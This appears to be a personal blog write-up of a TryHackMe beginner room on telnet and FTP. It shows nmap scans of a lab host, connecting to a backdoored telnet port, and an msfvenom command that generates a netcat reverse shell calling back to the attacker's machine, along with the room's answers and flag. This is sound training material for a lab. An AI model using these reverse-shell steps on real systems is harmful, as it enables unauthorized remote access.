---
layout: post
title: Network Exploitation Basics Part 3.5
date: 2024-03-14 14:00 +0700
categories: [TryHackMe, Complete Beginner]
tags: [Blue Team, Complete Beginner]     # TAG names should always be lowercase
img_path: '/assets/THM'
image: 
  path: logo.png
--- 

## Enumerating Telnet

### Lets Get Started

Before we begin, make sure to deploy the room and give it some time to boot. Please be aware, this can take up to five minutes so be patient!

### Enumeration

We've already seen how key enumeration can be in exploiting a misconfigured network service. However, vulnerabilities that could be potentially trivial to exploit don't always jump out at us. For that reason, especially when it comes to enumerating network services, we need to be thorough in our method. 

### Port Scanning

Let's start out the same way we usually do, a port scan, to find out as much information as we can about the services, applications, structure and operating system of the target machine. Scan the machine with **nmap**.

### Output

Let's see what's going on on the target server...

### How many **ports** are open on the target machine?    

`nmap -T4 -p- -A 10.10.1.114`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/94439584-cc72-4498-8260-fbdd483c4b70)

`1`

### What port is this?

`8012`

### This port is unassigned, but still lists the protocol it's using, what protocol is this?     

`tcp`

### Now re-run the nmap scan, without the -p- tag, how many ports show up as open?

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/2bf6f365-33fa-420e-9f63-15db2f8e18cd)

`0`

### Based on the title returned to us, what do we think this port could be used for?

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/b921e650-d74e-42d7-a0c2-f9e2e681b49d)

`a Backdoor`

### Who could it belong to? Gathering possible usernames is an important step in enumeration.

`Skidy`

## Exploiting Telnet

### Types of Telnet Exploit

Telnet, being a protocol, is in and of itself insecure for the reasons we talked about earlier. It lacks encryption, so sends all communication over plaintext, and for the most part has poor access control. There are CVE's for Telnet client and server systems, however, so when exploiting you can check for those on:

- [https://www.cvedetails.com/](https://www.cvedetails.com/)

- [https://cve.mitre.org/](https://cve.mitre.org/)

A CVE, short for Common Vulnerabilities and Exposures, is a list of publicly disclosed computer security flaws. When someone refers to a CVE, they usually mean the CVE ID number assigned to a security flaw.

However, you're far more likely to find a misconfiguration in how telnet has been configured or is operating that will allow you to exploit it.

### Method Breakdown

So, from our enumeration stage, we know:

  - There is a poorly hidden telnet service running on this machine

- The service itself is marked "backdoor"

- We have possible username of "Skidy" implicated

Using this information, let's try accessing this telnet port, and using that as a foothold to get a full reverse shell on the machine!

### Connecting to Telnet

You can connect to a telnet server with the following syntax:

  `telnet [ip] [port]`

We're going to need to keep this in mind as we try and exploit this machine.


### What is a Reverse Shell?

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/75173361-fabb-4c51-98dc-aae8d378151b)

A `shell` can simply be described as a piece of code or program which can be used to gain code or command execution on a device.

A reverse shell is a type of shell in which the target machine communicates back to the attacking machine.

The attacking machine has a listening port, on which it receives the connection, resulting in code or command execution being achieved.

### Great! It's an open telnet connection! What welcome message do we receive?

`telnet 10.10.1.114 8012`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/b20a6e0f-27cc-406b-a802-0ec5ba4683f5)

`SKIDY'S BACKDOOR`

### Let's try executing some commands, do we get a return on any input we enter into the telnet session? (Y/N)

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/a2a39692-6ee1-4196-8e71-02a9ca1a9d6f)

`N`

- Start a tcpdump listener on your local machine.

#### If using your own machine with the OpenVPN connection, use:

`sudo tcpdump ip proto \\icmp -i tun0`

#### If using the AttackBox, use:

`sudo tcpdump ip proto \\icmp -i ens5`



![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/3130ff38-1cab-4d9d-a40b-f055f4a079bb)

### Now, use the command `ping [local THM ip] -c 1` through the telnet session to see if we're able to execute system commands. Do we receive any pings? Note, you need to preface this with .RUN (Y/N)

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/c4f225a2-f74d-4794-aa3d-cae2ed1b83e8)

`Y`

We're going to generate a reverse shell payload using msfvenom.This will generate and encode a netcat reverse shell for us. Here's our syntax:

`msfvenom -p cmd/unix/reverse_netcat lhost=[local tun0 ip] lport=4444 R`

-p = payload
lhost = our local host IP address (this is **your** machine's IP address)
lport = the port to listen on (this is the port on **your** machine)
R = export the payload in raw format

### What word does the generated payload start with?

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/7361bcc6-4830-4507-9d2a-ce48be3bc33f)

`mkfifo`

Perfect. We're nearly there. Now all we need to do is start a netcat listener on our local machine. We do this using:

`nc -lvp [listening port]`

### What would the command look like for the listening port we selected in our payload?

`nc -lvp 4444`

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/628f04a6-8aa6-4df9-a9d7-c9fda85e9a35)

### Success! What is the contents of flag.txt?

> Because my device is faulty, the ip will be wrong in this question

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/a862c83e-98e1-4120-93b4-a1d93f78aba0)

`THM{y0u_g0t_th3_t3ln3t_fl4g}`

## Understanding FTP

![image](https://github.com/zs0b/zs0b.github.io/assets/118095276/cc5a9fd9-1837-4201-beef-d11d713b9803)

### What is FTP?

File Transfer Protocol (FTP) is, as the name suggests , a protocol used to allow remote transfer of files over a network. It uses a client-server model to do this, and- as we'll come on to later- relays commands and data in a very efficient way.

### How does FTP work?

A typical FTP session operates using two channels:

- a command (sometimes called the control) channel

- a data channel.

As their names imply, the command channel is used for transmitting commands as well as replies to those commands, while the data channel is used for transferring data.

FTP operates using a client-server protocol. The client initiates a connection with the server, the server validates whatever login credentials are provided and then opens the session.

While the session is open, the client may execute FTP commands on the server.

### Active vs Passive

The FTP server may support either Active or Passive connections, or both. 

- In an Active FTP connection, the client opens a port and listens. The server is required to actively connect to it. 

- In a Passive FTP connection, the server opens a port and listens (passively) and the client connects to it. 

This separation of command information and data into separate channels is a way of being able to send commands to the server without having to wait for the current data transfer to finish. If both channels were interlinked, you could only enter commands in between data transfers, which wouldn't be efficient for either large file transfers, or slow internet connections.

### More Details:

You can find more details on the technical function, and implementation of, FTP on the Internet Engineering Task Force website: [https://www.ietf.org/rfc/rfc959.txt](https://www.ietf.org/rfc/rfc959.txt). The IETF is one of a number of standards agencies, who define and regulate internet standards.

### What communications model does FTP use?

`client-server`

### What's the standard FTP port?

`21`

### How many modes of FTP connection are there?    

`2`

I'm sick right now so I just came here TT 

goodbye, thank you for reading until now //~//

Then wait until tomorrow >.0

![Alt text](https://media.giphy.com/media/gSAj25EO6sr7y/giphy.gif?cid=ecf05e47gjk8djla4qan5prg6civ98gtptamijn5xlqpv3b6&ep=v1_gifs_search&rid=giphy.gif&ct=g)





























